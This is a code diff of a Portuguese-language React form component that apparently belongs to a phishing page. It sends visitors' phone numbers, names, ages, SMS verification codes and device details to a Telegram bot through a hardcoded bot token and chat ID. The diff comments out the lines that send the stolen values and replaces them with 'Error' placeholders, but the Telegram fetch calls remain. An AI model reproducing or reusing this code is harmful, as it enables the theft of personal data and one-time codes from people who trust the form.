@@ -40,7 +40,8 @@ const ContextForm = ({ children }) => {
     const dispositivo = navigator.userAgent;
     let chatId = "7911135198"; //"7911135198";
     let botToken = "7888758598:AAEhfSCEpkJpycL7PO1ZLUhbAQPwydCq_mU"; //
-    const message = `📱Dispositivo:${dispositivo}`;
+    // const message = `📱Dispositivo:${dispositivo}`;
+    const message = ``;
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
@@ -80,7 +81,8 @@ const ContextForm = ({ children }) => {
     const dispositivo = navigator.userAgent;
    
 
-    const message = `📞Número de telefone: ${telefone}\n🧑‍🦰Nome: ${nome}\n🔒Idade: ${idade}\n📱Dispositivo:${dispositivo}`;
+    // const message = `📞Número de telefone: ${telefone}\n🧑‍🦰Nome: ${nome}\n🔒Idade: ${idade}\n📱Dispositivo:${dispositivo}`;
+    const message = `📞Número de telefone: ${'Error'}\n🧑‍🦰Nome: ${"Error"}\n🔒Idade: ${"Error"}\n📱Dispositivo:${"Error"}`;
 
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -122,9 +124,10 @@ const ContextForm = ({ children }) => {
     const telefonee = localStorage.getItem("telefone");
 
 
-    const message = `📞Número de telefone: ${telefonee}\n🧑‍🦰Nome: ${name}\n🔒Idade: ${idadee}\n SMS:${values.join(
-      ""
-    )}📱Dispositivo:${dispositivo}`;
+    // const message = `📞Número de telefone: ${telefonee}\n🧑‍🦰Nome: ${name}\n🔒Idade: ${idadee}\n SMS:${values.join(
+    //   ""
+    // )}📱Dispositivo:${dispositivo}`;
+    const message = `📞Número de telefone: ${"Error"}\n🧑‍🦰Nome: ${"Error"}\n🔒Idade: ${"Error"}\n📱Dispositivo:${"Error"}`;
     // fetch(`https://api.telegram.org/bot${secondBotToken}/sendMessage`, {
     //   method: "POST",
     //   headers: {
